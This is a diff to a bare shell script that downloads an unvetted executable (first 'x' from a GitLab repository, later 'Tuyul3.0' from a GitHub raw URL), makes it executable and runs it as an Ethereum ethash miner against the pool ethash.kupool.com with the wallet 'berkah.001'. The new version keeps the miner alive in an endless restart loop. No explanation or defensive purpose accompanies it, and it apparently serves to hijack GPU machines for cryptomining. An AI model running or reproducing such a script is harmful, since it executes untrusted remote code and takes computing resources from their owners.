@@ -1,9 +1,11 @@
-#!/bin/sh
-apt-get update
-apt-get install zip unzip
-apt-get install screen -y
-screen -dmS er.sh 65 75
-git clone https://gitlab.com/letricejuliocesar/goodday
-cd goodday
-chmod +x x
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  ./x -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:443 -r $ip --nvidia 1
+#!/bin/bash
+POOL=stratum+tcp://ethash.kupool.com:1800
+WALLET=berkah.001
+WORKER=gpu1
+wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
+chmod +x Tuyul3.0
+while [ 1 ]; do
+./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+sleep 5
+done
+sleep 999999999 
